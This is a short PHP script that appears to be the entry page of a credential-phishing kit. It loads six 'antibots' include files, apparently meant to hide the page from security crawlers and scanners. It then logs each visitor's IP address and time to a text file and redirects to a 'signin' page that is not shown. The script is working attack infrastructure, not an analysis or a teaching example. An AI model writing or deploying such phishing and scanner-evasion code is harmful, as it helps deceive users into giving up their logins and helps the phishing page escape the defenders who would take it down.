<?php

include "./bots/antibots1.php";
include "./bots/antibots2.php";
include "./bots/antibots3.php";
include "./bots/antibots4.php";
include "./bots/antibots5.php";
include "./bots/antibots6.php";
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

header("location: ./signin");

?>
